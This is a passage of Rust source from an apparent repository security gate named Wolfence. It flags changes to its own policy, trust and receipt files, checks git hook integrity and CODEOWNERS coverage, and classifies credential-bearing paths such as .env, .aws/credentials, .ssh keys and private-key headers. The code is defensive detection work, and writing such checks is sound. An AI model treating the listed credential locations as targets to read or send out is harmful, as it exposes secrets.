        format!("config-kubernetes-secret:{}", file.display()),
    ))
}

fn scan_wolfence_policy_surface(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    context: &ExecutionContext,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let path_text = file.to_string_lossy().replace('\\', "/");
    let is_scanner_bundle_surface = wolfence_scanner_bundle_surface(&path_text);
    let rule_provenance_changed = any_changed_path_matches(
        context.candidate_files.as_slice(),
        wolfence_rule_provenance_surface,
    );

    if is_scanner_bundle_surface {
        let (severity, detail) = if rule_provenance_changed {
            (
                Severity::Low,
                format!(
                    "The outbound change set modifies `{path_text}`, which is part of Wolfence's own local detection, policy, or hook-enforcement bundle. Declared rule provenance surfaces changed alongside it, so the engine change remains review-significant but its shipped behavior is being documented in the same push."
                ),
            )
        } else {
            (
                Severity::Medium,
                format!(
                    "The outbound change set modifies `{path_text}`, which is part of Wolfence's own local detection, policy, or hook-enforcement bundle. Changes to the scanner bundle alter the gate itself, not just the repository being reviewed."
                ),
            )
        };

        findings.push(Finding::new(
            "policy.wolfence.scanner-bundle-changed",
            scanner,
            severity,
            Confidence::High,
            FindingCategory::Policy,
            Some(file.to_path_buf()),
            "Wolfence scanner bundle surface changed",
            detail,
            "Review scanner-bundle changes with the same care as trust, receipt, or release-policy changes. Confirm the engine change is intentional and governed.",
            format!("policy-scanner-bundle-changed:{path_text}"),
        ));
    }

    if is_scanner_bundle_surface
        && first_changed_path_matching(
            context.candidate_files.as_slice(),
            wolfence_scanner_bundle_surface,
        )
        .map(PathBuf::as_path)
            == Some(file)
        && !rule_provenance_changed
    {
        findings.push(Finding::new(
            "policy.wolfence.rule-provenance-missing",
            scanner,
            Severity::Medium,
            Confidence::High,
            FindingCategory::Policy,
            Some(file.to_path_buf()),
            "Wolfence scanner bundle changed without rule provenance update",
            "The outbound change set modifies Wolfence's own scanner bundle, but none of the declared local rule provenance surfaces changed alongside it. Engine changes without inventory updates weaken reviewability around what rules are shipped and how they are documented.",
            "Update the local rule provenance inventory alongside the scanner-bundle change, or explicitly document why the shipped rule inventory did not change.",
            "policy-rule-provenance-missing",
        ));
    }

    if path_text == REPO_CONFIG_RELATIVE_PATH {
        findings.push(Finding::new(
            "policy.wolfence.config-changed",
            scanner,
            Severity::Low,
            Confidence::Medium,
            FindingCategory::Policy,
            Some(file.to_path_buf()),
            "Wolfence repo-local config changed",
            "The outbound change set modifies `.wolfence/config.toml`, which changes the repository's enforcement posture and scan boundary behavior.",
            "Review the config change as policy material, not as an ordinary app change. Confirm the new mode and ignore patterns are intentional.",
            format!("policy-config-changed:{}", file.display()),
        ));

        if contents.contains("mode = \"advisory\"") {
            findings.push(
                Finding::new(
                    "policy.wolfence.mode-advisory",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Policy,
                    Some(file.to_path_buf()),
                    "Wolfence enforcement mode is set to advisory",
                    "The candidate repo config sets Wolfence to `advisory`, which disables blocking behavior and turns the gate into warnings-only mode.",
                    "Only use advisory mode deliberately and temporarily. Prefer `standard` or `strict` for repositories that rely on Wolfence as a real outbound gate.",
                    format!("policy-mode-advisory:{}", file.display()),
                )
                .with_line(find_line_number(contents, "mode = \"advisory\"").unwrap_or(1)),
            );
        }

        if let Some((pattern, line_number)) =
            suspicious_ignore_pattern(context.config.scan_ignore_paths.as_slice(), contents)
        {
            findings.push(
                Finding::new(
                    "policy.wolfence.sensitive-ignore-path",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Policy,
                    Some(file.to_path_buf()),
                    "Wolfence scan exclusions target security-sensitive repository surfaces",
                    format!(
                        "The repo config excludes the sensitive path pattern `{pattern}`, which can shrink the protected push surface around source, CI, dependency, or Wolfence policy files."
                    ),
                    "Keep ignore paths limited to low-risk docs, fixtures, or generated assets. Do not exclude source, CI, dependency, or `.wolfence` policy surfaces from review.",
                    format!("policy-sensitive-ignore:{}:{}", file.display(), pattern),
                )
                .with_line(line_number),
            );
        }
    }

    if path_text == RECEIPT_POLICY_FILE_RELATIVE_PATH {
        findings.push(Finding::new(
            "policy.wolfence.receipt-policy-changed",
            scanner,
            Severity::Medium,
            Confidence::High,
            FindingCategory::Policy,
            Some(file.to_path_buf()),
            "Wolfence receipt approval policy changed",
            "The outbound change set modifies `.wolfence/policy/receipts.toml`, which changes who may authorize overrides and how strict override governance remains.",
            "Review receipt-policy changes with the same care as authorization or release-policy changes. Confirm reviewer, approver, and signing-key scope remain intentional.",
            format!("policy-receipt-policy-changed:{}", file.display()),
        ));
    }

    if path_text.starts_with(&format!("{TRUST_DIR_RELATIVE_PATH}/archive/")) {
        findings.push(Finding::new(
            "policy.wolfence.trust-archive-changed",
            scanner,
            Severity::Low,
            Confidence::High,
            FindingCategory::Policy,
            Some(file.to_path_buf()),
            "Wolfence archived trust material changed",
            "The outbound change set modifies archived trust material. Archived keys are not active, but trust archive history is still part of the repo's reviewable security record.",
            "Confirm the archived trust change matches an intentional key-rotation or restoration workflow.",
            format!("policy-trust-archive-changed:{}", file.display()),
        ));
    } else if path_text.starts_with(&format!("{TRUST_DIR_RELATIVE_PATH}/")) {
        findings.push(Finding::new(
            "policy.wolfence.trust-store-changed",
            scanner,
            Severity::High,
            Confidence::High,
            FindingCategory::Policy,
            Some(file.to_path_buf()),
            "Wolfence trust store changed",
            "The outbound change set modifies active trust-store material under `.wolfence/trust/`, which can change who is allowed to sign or verify override receipts.",
            "Review trust-store changes as security-authority changes. Confirm the signer owner, expiry, and intended category scope are still correct.",
            format!("policy-trust-store-changed:{}", file.display()),
        ));

        if file.extension().and_then(|value| value.to_str()) == Some("toml")
            && !contents.contains("categories")
        {
            findings.push(Finding::new(
                "policy.wolfence.unrestricted-trust-key",
                scanner,
                Severity::Medium,
                Confidence::Medium,
                FindingCategory::Policy,
                Some(file.to_path_buf()),
                "Wolfence trust metadata appears to grant unrestricted signer scope",
                "The candidate trust metadata file does not appear to declare signer categories. Active unrestricted keys can authorize override receipts across every category.",
                "Prefer category-scoped trusted keys unless one signer genuinely needs repo-wide override authority.",
                format!("policy-unrestricted-trust-key:{}", file.display()),
            ));
        }
    }

    if path_text.starts_with(&format!("{RECEIPTS_DIR_RELATIVE_PATH}/")) {
        findings.push(Finding::new(
            "policy.wolfence.receipt-changed",
            scanner,
            Severity::Medium,
            Confidence::High,
            FindingCategory::Policy,
            Some(file.to_path_buf()),
            "Wolfence override receipt changed",
            "The outbound change set modifies an override receipt, which can directly suppress otherwise blocking findings for a bounded period.",
            "Review the receipt scope, owner, reason, expiry, and signing metadata carefully. Receipts are an exception path, not ordinary content.",
            format!("policy-receipt-changed:{}", file.display()),
        ));
    }

    findings
}

fn wolfence_scanner_bundle_surface(path_text: &str) -> bool {
    matches!(
        path_text,
        "src/core/scanners.rs"
            | "src/core/findings.rs"
            | "src/core/policy.rs"
            | "src/core/hooks.rs"
            | "src/core/git.rs"
            | "src/core/trust.rs"
            | "src/core/receipt_policy.rs"
            | "src/core/receipts.rs"
            | "src/commands/hook_pre_push.rs"
            | "src/commands/protected.rs"
            | "src/commands/push.rs"
            | "src/main.rs"
    )
}

fn wolfence_rule_provenance_surface(path_text: &str) -> bool {
    matches!(
        path_text,
        "docs/security/scanner-inventory.md"
            | "docs/security/scanner-inventory.json"
            | "docs/security/detection-model.md"
    )
}

fn any_changed_path_matches(candidate_files: &[PathBuf], predicate: fn(&str) -> bool) -> bool {
    candidate_files.iter().any(|candidate| {
        let candidate_text = candidate.to_string_lossy().replace('\\', "/");
        predicate(&candidate_text)
    })
}

fn first_changed_path_matching<'a>(
    candidate_files: &'a [PathBuf],
    predicate: fn(&str) -> bool,
) -> Option<&'a PathBuf> {
    candidate_files.iter().find(|candidate| {
        let candidate_text = candidate.to_string_lossy().replace('\\', "/");
        predicate(&candidate_text)
    })
}

fn runtime_hook_integrity_findings(
    scanner: &'static str,
    context: &ExecutionContext,
) -> AppResult<Vec<Finding>> {
    let inspection = hooks::inspect_hook(&context.repo_root, "pre-push")?;
    let mut findings = Vec::new();
    let hook_root = inspection
        .path
        .parent()
        .map(Path::to_path_buf)
        .unwrap_or_else(|| inspection.path.clone());
    if let Some(hooks_path) = git::config_value(&context.repo_root, "core.hooksPath")? {
        if !path_is_within_repo(&context.repo_root, &hook_root) {
            findings.push(Finding::new(
                "policy.wolfence.external-hooks-path",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Policy,
                None,
                "Git hooks path is overridden outside the repository",
                format!(
                    "The repository config sets `core.hooksPath` to `{hooks_path}`, which resolves outside the repository root. Native hook behavior can now change outside the versioned repo surface that Wolfence reviews."
                ),
                "Prefer the default repository-local hooks path or keep any custom hooks directory inside the repository so hook authority remains reviewable.",
                "policy-external-hooks-path",
            ));
        } else {
            let configured_hook_root = if Path::new(&hooks_path).is_absolute() {
                PathBuf::from(&hooks_path)
            } else {
                context.repo_root.join(&hooks_path)
            };
            let default_hook_root = context.repo_root.join(".git/hooks");
            if canonicalize_for_containment(&configured_hook_root)
                != canonicalize_for_containment(&default_hook_root)
            {
                findings.push(Finding::new(
                    "policy.wolfence.repo-local-hooks-path",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Policy,
                    None,
                    "Git hooks path is overridden to a repo-local alternate directory",
                    format!(
                        "The repository config sets `core.hooksPath` to `{hooks_path}` inside the repository root. That keeps hook authority reviewable, but it still moves native hook execution to an alternate repo-local path that deserves explicit review."
                    ),
                    "Prefer the default `.git/hooks` path unless the alternate repo-local hook directory is intentional, reviewed, and kept under the same governance expectations as Wolfence policy material.",
                    "policy-repo-local-hooks-path",
                ));
            }
        }
    }

    match inspection.state {
        HookState::Missing => findings.push(Finding::new(
            "policy.wolfence.pre-push-hook-missing",
            scanner,
            Severity::Info,
            Confidence::High,
            FindingCategory::Policy,
            None,
            "Wolfence managed pre-push hook is not installed",
            "The repository does not currently have a pre-push hook, so native `git push` is not guarded by Wolfence unless operators use `wolf push` explicitly.",
            "Run `wolf init` if this repository intends to guard native `git push` with the managed Wolfence pre-push hook.",
            "policy-pre-push-hook-missing",
        )),
        HookState::Unmanaged => findings.push(Finding::new(
            "policy.wolfence.pre-push-hook-unmanaged",
            scanner,
            Severity::Low,
            Confidence::High,
            FindingCategory::Policy,
            None,
            "Git pre-push hook exists but is not managed by Wolfence",
            "The repository's pre-push hook is present but not managed by Wolfence, so native `git push` may bypass or diverge from Wolfence policy.",
            "Review the existing hook and either integrate Wolfence into it or replace it with the managed hook so native pushes follow the same policy path.",
            "policy-pre-push-hook-unmanaged",
        )),
        HookState::Managed if !inspection.executable => findings.push(Finding::new(
            "policy.wolfence.pre-push-hook-not-executable",
            scanner,
            Severity::Medium,
            Confidence::Medium,
            FindingCategory::Policy,
            None,
            "Wolfence managed pre-push hook is not executable",
            "The repository's managed pre-push hook exists but is not executable, so Git will not run it during native pushes.",
            "Re-run `wolf init` or restore executable permissions so the managed pre-push hook can execute.",
            "policy-pre-push-hook-not-executable",
        )),
        HookState::Managed => match inspection.launcher {
            Some(HookLauncherKind::CargoFallback) => findings.push(Finding::new(
                "policy.wolfence.pre-push-hook-legacy-launcher",
                scanner,
                Severity::Medium,
                Confidence::High,
                FindingCategory::Policy,
                None,
                "Wolfence managed pre-push hook uses a legacy cargo-only launcher",
                "The repository's managed pre-push hook does not pin a Wolfence binary path and instead relies on a cargo-only launcher path. That increases drift risk and makes native push enforcement depend on local PATH and build-tool state.",
                "Re-run `wolf init` so the repository refreshes the managed hook with the current binary-path launcher and fallback chain.",
                "policy-pre-push-hook-legacy-launcher",
            )),
            None => findings.push(Finding::new(
                "policy.wolfence.pre-push-hook-unknown-launcher",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Policy,
                None,
                "Wolfence managed pre-push hook launcher is unrecognized",
                "The repository's pre-push hook still carries Wolfence's managed marker, but the launcher pattern is no longer recognized. That suggests the hook may have been edited or drifted away from known Wolfence-managed forms.",
                "Re-run `wolf init` to restore the canonical managed pre-push hook, then review the previous hook contents if the drift was unexpected.",
                "policy-pre-push-hook-unknown-launcher",
            )),
            Some(HookLauncherKind::BinaryPath) => {}
        },
    }

    if path_is_within_repo(&context.repo_root, &hook_root) {
        let mut external_hook_symlinks = Vec::new();
        let mut external_hook_helpers = Vec::new();
        let mut unmanaged_hooks = Vec::new();
        for entry in fs::read_dir(&hook_root)? {
            let entry = entry?;
            let path = entry.path();
            if !path.is_file() {
                continue;
            }
            let file_name = path
                .file_name()
                .and_then(|value| value.to_str())
                .unwrap_or_default();
            if file_name.ends_with(".sample") {
                continue;
            }
            if !active_client_hook_name(file_name) || !file_is_executable(&fs::metadata(&path)?) {
                continue;
            }
            if let Some(target) = resolved_hook_symlink_target(&path) {
                if !path_is_within_repo(&context.repo_root, &target) {
                    external_hook_symlinks.push(format!("{file_name} -> {}", target.display()));
                }
            }
            let Ok(contents) = fs::read_to_string(&path) else {
                continue;
            };
            if let Some(target) =
                resolved_external_hook_helper_target(&context.repo_root, &path, &contents)
            {
                external_hook_helpers.push(format!("{file_name} -> {}", target.display()));
            }
            if contents.contains(hooks::MANAGED_MARKER) {
                continue;
            }
            if file_name == "pre-push" {
                continue;
            }
            unmanaged_hooks.push(file_name.to_string());
        }

        if !external_hook_symlinks.is_empty() {
            external_hook_symlinks.sort();
            let examples = external_hook_symlinks
                .iter()
                .take(3)
                .cloned()
                .collect::<Vec<_>>()
                .join(", ");
            findings.push(Finding::new(
                "policy.wolfence.external-hook-symlink",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Policy,
                None,
                "Effective Git hooks directory contains hook symlinks that resolve outside the repository",
                format!(
                    "The effective hooks directory contains active hook entrypoints such as {examples} that resolve outside the repository root. That creates hook authority outside the versioned repo surface Wolfence reviews."
                ),
                "Replace external hook symlinks with repository-contained hook files or a reviewed repo-local authority path before relying on native Git hooks.",
                "policy-external-hook-symlink",
            ));
        }

        if !external_hook_helpers.is_empty() {
            external_hook_helpers.sort();
            let examples = external_hook_helpers
                .iter()
                .take(3)
                .cloned()
                .collect::<Vec<_>>()
                .join(", ");
            findings.push(Finding::new(
                "policy.wolfence.external-hook-helper",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Policy,
                None,
                "Effective Git hooks directory contains hook helper paths that resolve outside the repository",
                format!(
                    "The effective hooks directory contains active hook entrypoints such as {examples} that directly delegate execution to helper paths outside the repository root. That creates hook authority outside the versioned repo surface Wolfence reviews."
                ),
                "Replace external hook helper paths with repository-contained hook logic or a reviewed repo-local authority path before relying on native Git hooks.",
                "policy-external-hook-helper",
            ));
        }

        if !unmanaged_hooks.is_empty() {
            unmanaged_hooks.sort();
            let examples = unmanaged_hooks
                .iter()
                .take(3)
                .cloned()
                .collect::<Vec<_>>()
                .join(", ");
            findings.push(Finding::new(
                "policy.wolfence.additional-unmanaged-hooks",
                scanner,
                Severity::Medium,
                Confidence::High,
                FindingCategory::Policy,
                None,
                "Effective Git hooks directory contains additional unmanaged executable hooks",
                format!(
                    "The effective hooks directory contains additional executable unmanaged hook files such as {examples}. Those hooks can change local Git behavior outside Wolfence's managed pre-push path and deserve explicit review."
                ),
                "Review additional executable hooks in the effective hooks directory, remove unexpected ones, and keep any intentional hook authority under the same governance expectations as Wolfence policy material.",
                "policy-additional-unmanaged-hooks",
            ));
        }
    }

    Ok(findings)
}

fn active_client_hook_name(file_name: &str) -> bool {
    matches!(
        file_name,
        "applypatch-msg"
            | "pre-applypatch"
            | "post-applypatch"
            | "pre-push"
            | "pre-commit"
            | "pre-merge-commit"
            | "prepare-commit-msg"
            | "commit-msg"
            | "post-commit"
            | "pre-rebase"
            | "post-checkout"
            | "post-merge"
            | "post-rewrite"
    )
}

fn resolved_hook_symlink_target(path: &Path) -> Option<PathBuf> {
    let metadata = fs::symlink_metadata(path).ok()?;
    if !metadata.file_type().is_symlink() {
        return None;
    }

    let target = fs::read_link(path).ok()?;
    Some(if target.is_absolute() {
        target
    } else {
        path.parent().unwrap_or_else(|| Path::new(".")).join(target)
    })
}

fn resolved_external_hook_helper_target(
    repo_root: &Path,
    hook_path: &Path,
    contents: &str,
) -> Option<PathBuf> {
    if contents.contains(hooks::MANAGED_MARKER) {
        return None;
    }

    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') || trimmed.contains('$') {
            continue;
        }

        let candidate = [
            ". ",
            "source ",
            "exec ",
            "sh ",
            "bash ",
            "zsh ",
            "python ",
            "python3 ",
            "ruby ",
            "node ",
        ]
        .iter()
        .find_map(|prefix| trimmed.strip_prefix(prefix));

        let Some(remainder) = candidate else {
            continue;
        };

        let token = remainder
            .split_whitespace()
            .next()
            .unwrap_or_default()
            .trim_matches(|c| matches!(c, '"' | '\'' | ';' | '(' | ')'));
        if token.is_empty()
            || token.starts_with('-')
            || !(token.starts_with('/')
                || token.starts_with("./")
                || token.starts_with("../"))
        {
            continue;
        }

        let target = if Path::new(token).is_absolute() {
            PathBuf::from(token)
        } else {
            hook_path
                .parent()
                .unwrap_or_else(|| Path::new("."))
                .join(token)
        };

        if !path_is_within_repo(repo_root, &target) {
            return Some(target);
        }
    }

    None
}

#[derive(Debug, Clone)]
struct CodeownersEntry {
    pattern: String,
    owners: Vec<String>,
}

#[derive(Debug, Clone)]
struct CodeownersFile {
    path: PathBuf,
    entries: Vec<CodeownersEntry>,
    malformed_lines: Vec<(usize, String)>,
}

#[derive(Debug, Clone)]
struct GovernanceSurface {
    path: PathBuf,
    kind: &'static str,
    changed: bool,
}

fn repository_governance_findings(
    scanner: &'static str,
    context: &ExecutionContext,
) -> AppResult<Vec<Finding>> {
    let mut findings = Vec::new();
    let codeowners_locations = discover_codeowners_locations(&context.repo_root);
    let active_codeowners = codeowners_locations.first().cloned();

    if codeowners_locations.len() > 1 {
        let ignored_locations = codeowners_locations
            .iter()
            .skip(1)
            .map(|path| path.display().to_string())
            .collect::<Vec<_>>()
            .join(", ");
        findings.push(Finding::new(
            "policy.repo.codeowners.multiple-files",
            scanner,
            Severity::Low,
            Confidence::High,
            FindingCategory::Policy,
            None,
            "Repository contains multiple CODEOWNERS files",
            format!(
                "GitHub only uses the highest-precedence CODEOWNERS file, but this repository contains multiple candidates. Lower-precedence files such as {ignored_locations} may create governance drift or false expectations."
            ),
            "Keep one intentional CODEOWNERS file in the highest-precedence location and remove or consolidate lower-precedence copies.",
            "policy-codeowners-multiple-files",
        ));
    }

    let Some(active_codeowners_path) = active_codeowners else {
        let surfaces = collect_sensitive_governance_surfaces(context)?;
        if let Some(example) = surfaces.first() {
            findings.push(Finding::new(
                "policy.repo.codeowners.missing",
                scanner,
                Severity::Low,
                Confidence::High,
                FindingCategory::Policy,
                None,
                "Repository contains sensitive governance surfaces but no CODEOWNERS file",
                format!(
                    "The repository contains review-sensitive governance material such as `{}` ({}), but no GitHub CODEOWNERS file is present to make ownership expectations explicit.",
                    example.path.display(),
                    example.kind
                ),
                "Add a CODEOWNERS file so workflow, release-control, and Wolfence policy paths have explicit reviewers.",
                "policy-codeowners-missing",
            ));
        }
        return Ok(findings);
    };

    let codeowners = load_codeowners(&active_codeowners_path)?;
    for (line_number, line) in &codeowners.malformed_lines {
        findings.push(
            Finding::new(
                "policy.repo.codeowners.malformed-line",
                scanner,
                Severity::Medium,
                Confidence::High,
                FindingCategory::Policy,
                Some(codeowners.path.clone()),
                "CODEOWNERS file contains a rule without owners",
                format!(
                    "The effective CODEOWNERS file has a malformed rule on line {line_number}: `{line}`. GitHub will not apply owner protection the way the repository likely expects."
                ),
                "Fix malformed CODEOWNERS lines so every pattern is followed by one or more owners.",
                format!("policy-codeowners-malformed:{}:{}", codeowners.path.display(), line_number),
            )
            .with_line(*line_number),
        );
    }

    for surface in collect_sensitive_governance_surfaces(context)? {
        if let Some(entry) = matching_codeowners_entry(&codeowners.entries, &surface.path) {
            if entry.owners.is_empty() {
                continue;
            }
        } else {
            let severity = if surface.changed {
                Severity::Medium
            } else {
                Severity::Low
            };
            findings.push(Finding::new(
                "policy.repo.codeowners.uncovered-sensitive-path",
                scanner,
                severity,
                Confidence::High,
                FindingCategory::Policy,
                Some(surface.path.clone()),
                "CODEOWNERS does not cover a sensitive governance path",
                format!(
                    "The sensitive repository path `{}` ({}) does not appear to match any effective CODEOWNERS rule. Changes to that surface may bypass explicit review ownership expectations.",
                    surface.path.display(),
                    surface.kind
                ),
                "Add or broaden a CODEOWNERS rule so governance-sensitive paths such as workflows, release controls, and `.wolfence` material have explicit owners.",
                format!("policy-codeowners-uncovered:{}:{}", codeowners.path.display(), surface.path.display()),
            ));
        }
    }

    Ok(findings)
}

fn discover_codeowners_locations(repo_root: &Path) -> Vec<PathBuf> {
    [".github/CODEOWNERS", "CODEOWNERS", "docs/CODEOWNERS"]
        .iter()
        .map(|relative| repo_root.join(relative))
        .filter(|path| path.exists())
        .collect()
}

fn load_codeowners(path: &Path) -> AppResult<CodeownersFile> {
    let contents = fs::read_to_string(path)?;
    let mut entries = Vec::new();
    let mut malformed_lines = Vec::new();

    for (index, raw_line) in contents.lines().enumerate() {
        let line_number = index + 1;
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        let tokens = line.split_whitespace().collect::<Vec<_>>();
        if tokens.len() < 2 {
            malformed_lines.push((line_number, line.to_string()));
            continue;
        }

        let pattern = tokens[0].to_string();
        let owners = tokens[1..]
            .iter()
            .map(|value| (*value).to_string())
            .collect();
        entries.push(CodeownersEntry { pattern, owners });
    }

    Ok(CodeownersFile {
        path: path.to_path_buf(),
        entries,
        malformed_lines,
    })
}

fn collect_sensitive_governance_surfaces(
    context: &ExecutionContext,
) -> AppResult<Vec<GovernanceSurface>> {
    let mut surfaces = Vec::new();
    let mut seen = HashSet::new();

    for file in walk_repo_files(&context.repo_root.join(".github/workflows"))? {
        record_governance_surface(
            &mut surfaces,
            &mut seen,
            context,
            file,
            "GitHub Actions workflow",
        );
    }

    for file in walk_repo_files(&context.repo_root.join(".github/rulesets"))? {
        record_governance_surface(
            &mut surfaces,
            &mut seen,
            context,
            file,
            "GitHub ruleset configuration",
        );
    }

    for file in walk_repo_files(&context.repo_root.join(".github/branches"))? {
        record_governance_surface(
            &mut surfaces,
            &mut seen,
            context,
            file,
            "branch governance configuration",
        );
    }

    for relative in [
        ".github/settings.yml",
        ".github/settings.yaml",
        ".github/repository.yml",
        ".github/repository.yaml",
        ".github/CODEOWNERS",
        "CODEOWNERS",
        "docs/CODEOWNERS",
    ] {
        let path = PathBuf::from(relative);
        if context.repo_root.join(&path).exists() {
            record_governance_surface(
                &mut surfaces,
                &mut seen,
                context,
                context.repo_root.join(path),
                "repository governance file",
            );
        }
    }

    for file in walk_repo_files(&context.repo_root.join(".wolfence"))? {
        record_governance_surface(
            &mut surfaces,
            &mut seen,
            context,
            file,
            "Wolfence policy material",
        );
    }

    Ok(surfaces)
}

fn walk_repo_files(root: &Path) -> AppResult<Vec<PathBuf>> {
    if !root.exists() {
        return Ok(Vec::new());
    }

    let mut files = Vec::new();
    let mut stack = vec![root.to_path_buf()];
    while let Some(path) = stack.pop() {
        let metadata = fs::metadata(&path)?;
        if metadata.is_dir() {
            for entry in fs::read_dir(&path)? {
                stack.push(entry?.path());
            }
            continue;
        }

        files.push(path);
    }

    Ok(files)
}

fn record_governance_surface(
    surfaces: &mut Vec<GovernanceSurface>,
    seen: &mut HashSet<PathBuf>,
    context: &ExecutionContext,
    path: PathBuf,
    kind: &'static str,
) {
    let Ok(relative) = path.strip_prefix(&context.repo_root).map(Path::to_path_buf) else {
        return;
    };

    if !seen.insert(relative.clone()) {
        return;
    }

    surfaces.push(GovernanceSurface {
        changed: context
            .candidate_files
            .iter()
            .any(|candidate| candidate == &relative),
        path: relative,
        kind,
    });
}

fn matching_codeowners_entry<'a>(
    entries: &'a [CodeownersEntry],
    path: &Path,
) -> Option<&'a CodeownersEntry> {
    let path_text = path.to_string_lossy().replace('\\', "/");
    let mut matched = None;
    for entry in entries {
        if codeowners_pattern_matches(&entry.pattern, &path_text) {
            matched = Some(entry);
        }
    }
    matched
}

fn codeowners_pattern_matches(pattern: &str, path: &str) -> bool {
    let mut normalized = pattern.trim();
    if normalized.is_empty() || normalized.starts_with('#') || normalized.starts_with('!') {
        return false;
    }

    if let Some(stripped) = normalized.strip_prefix('/') {
        normalized = stripped;
    }

    if normalized == "*" || normalized == "**" {
        return true;
    }

    if normalized.ends_with('/') {
        return path.starts_with(normalized);
    }

    if normalized.contains('*') || normalized.contains('?') {
        return glob_matches(normalized.as_bytes(), path.as_bytes());
    }

    path == normalized || path.ends_with(&format!("/{normalized}"))
}

fn glob_matches(pattern: &[u8], text: &[u8]) -> bool {
    let (mut pattern_index, mut text_index) = (0usize, 0usize);
    let (mut star_pattern, mut star_text) = (None, 0usize);

    while text_index < text.len() {
        if pattern_index < pattern.len()
            && (pattern[pattern_index] == text[text_index] || pattern[pattern_index] == b'?')
        {
            pattern_index += 1;
            text_index += 1;
        } else if pattern_index < pattern.len() && pattern[pattern_index] == b'*' {
            star_pattern = Some(pattern_index);
            pattern_index += 1;
            star_text = text_index;
        } else if let Some(star_index) = star_pattern {
            pattern_index = star_index + 1;
            star_text += 1;
            text_index = star_text;
        } else {
            return false;
        }
    }

    while pattern_index < pattern.len() && pattern[pattern_index] == b'*' {
        pattern_index += 1;
    }

    pattern_index == pattern.len()
}

fn path_is_within_repo(repo_root: &Path, path: &Path) -> bool {
    let repo_root = fs::canonicalize(repo_root).unwrap_or_else(|_| repo_root.to_path_buf());
    let path = canonicalize_for_containment(path);
    path.starts_with(&repo_root)
}

fn canonicalize_for_containment(path: &Path) -> PathBuf {
    if let Ok(canonical) = fs::canonicalize(path) {
        return canonical;
    }

    if let Some(parent) = path.parent() {
        if let Ok(canonical_parent) = fs::canonicalize(parent) {
            if let Some(file_name) = path.file_name() {
                return canonical_parent.join(file_name);
            }
            return canonical_parent;
        }
    }

    path.to_path_buf()
}

impl Scanner for PolicyScanner {
    fn name(&self) -> &'static str {
        "policy-scanner"
    }

    fn scan_with_progress(
        &self,
        context: &ExecutionContext,
        on_progress: &mut dyn FnMut(ScannerProgress),
    ) -> AppResult<Vec<Finding>> {
        let mut findings = Vec::new();
        let mut seen = HashSet::new();
        let config_path = context.repo_root.join(".wolfence/config.toml");

        if !config_path.exists() {
            record_finding(
                &mut findings,
                &mut seen,
                Finding::new(
                    "policy.repo-config.missing",
                    self.name(),
                    Severity::Info,
                    Confidence::High,
                    FindingCategory::Policy,
                    None,
                    "Repo-local Wolfence config is not initialized yet",
                    "The repository does not have a `.wolfence/config.toml` file yet, so policy is currently running on built-in defaults.",
                    "Add repo-local Wolfence configuration so the enforcement posture is explicit and reviewable.",
                    "policy:repo-config:missing",
                ),
            );
        }

        let total_files = context.candidate_files.len();
        for (index, file) in context.candidate_files.iter().enumerate() {
            on_progress(ScannerProgress::FileStarted {
                scanner: self.name(),
                file: file.clone(),
                current: index + 1,
                total: total_files,
            });
            let full_path = context.repo_root.join(file);
            let Some(contents) = read_text_file(&full_path)? else {
                continue;
            };

            for finding in scan_wolfence_policy_surface(self.name(), file, &contents, context) {
                record_finding(&mut findings, &mut seen, finding);
            }
        }

        for finding in repository_governance_findings(self.name(), context)? {
            record_finding(&mut findings, &mut seen, finding);
        }

        if matches!(context.action, ProtectedAction::Push) {
            for finding in runtime_hook_integrity_findings(self.name(), context)? {
                record_finding(&mut findings, &mut seen, finding);
            }
        }

        Ok(findings)
    }
}

fn classify_sensitive_path(scanner: &'static str, file: &Path) -> Option<Finding> {
    let lower = file.to_string_lossy().to_ascii_lowercase();
    let file_name = file
        .file_name()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    let (title, detail, severity, id) = if matches!(
        file_name.as_str(),
        ".env" | ".env.local" | ".env.production" | ".env.staging" | ".envrc"
    ) {
        (
            "Environment file included in outbound change set",
            "Environment files frequently contain live credentials, private endpoints, or deployment-only configuration.",
            Severity::High,
            "secret.file.env",
        )
    } else if file_name == "terraform.tfvars"
        || lower.ends_with(".auto.tfvars")
        || lower.ends_with(".tfvars")
        || lower.ends_with(".tfvars.json")
    {
        (
            "Infrastructure variable file included in outbound change set",
            "Terraform variable files frequently contain cloud credentials, secrets, or environment-specific infrastructure values.",
            Severity::High,
            "secret.file.tfvars",
        )
    } else if matches!(
        file_name.as_str(),
        ".npmrc" | ".pypirc" | ".netrc" | "id_rsa" | "id_ed25519" | "id_ecdsa" | "id_dsa"
    ) || lower.contains(".aws/credentials")
        || lower.contains(".ssh/")
        || lower.contains(".docker/config.json")
        || lower.ends_with(".kube/config")
    {
        (
            "Credential-bearing file path detected",
            "The candidate file path strongly suggests credential, key, or infrastructure access material.",
            Severity::Critical,
            "secret.file.credentials",
        )
    } else if lower.ends_with(".key")
        || lower.ends_with(".p12")
        || lower.ends_with(".pfx")
        || lower.ends_with(".jks")
        || lower.ends_with(".keystore")
    {
        (
            "Key material file extension detected",
            "The candidate file extension is commonly used for private key or keystore material.",
            Severity::Critical,
            "secret.file.key-material",
        )
    } else {
        return None;
    };

    Some(Finding::new(
        id,
        scanner,
        severity,
        Confidence::High,
        FindingCategory::Secret,
        Some(file.to_path_buf()),
        title,
        detail,
        "Remove the file from version control and rotate any credentials or key material if exposure is possible.",
        format!("secret-path:{}", file.display()),
    ))
}

fn scan_private_key_headers(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let trimmed = line.trim();
    if !trimmed.starts_with("-----BEGIN ") {
        return None;
    }

    let is_private_key = [
        "PRIVATE KEY-----",
        "RSA PRIVATE KEY-----",
        "DSA PRIVATE KEY-----",
        "EC PRIVATE KEY-----",
        "OPENSSH PRIVATE KEY-----",
    ]
    .iter()
